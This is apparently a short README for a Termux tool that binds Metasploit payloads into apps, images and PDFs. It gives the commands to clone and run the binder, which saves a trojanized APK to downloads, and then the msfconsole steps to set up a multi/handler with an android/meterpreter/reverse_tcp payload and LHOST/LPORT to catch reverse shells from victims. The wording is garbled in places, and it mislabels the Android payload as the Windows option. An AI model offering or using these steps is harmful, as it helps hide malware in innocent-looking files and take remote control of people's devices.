
This to is used to bind payload with other apps, images, PDFs, etc.

This will also help in making payload in metasploit.

And this can help you to install metasploit newest version.

pkg update && pkg upgrade -y

pkg install git && pkg install python && pkg install python2

git clone https://github.com/Adia12528/Payload_binding-tool.git

cd Payload_binding-tool

python payload_maker_tool.py

After the app is being.
Your apk is saved in your internal storage downloads.
And not you can use msfconsole exploit:

use exploit/multi/handler

use android/meterpreter/reverse_tcp 

Or for windows;

use android/meterpreter/reverse_tcp 
set LHOST "your ip"
set LPORT "used port in payload"
exploit
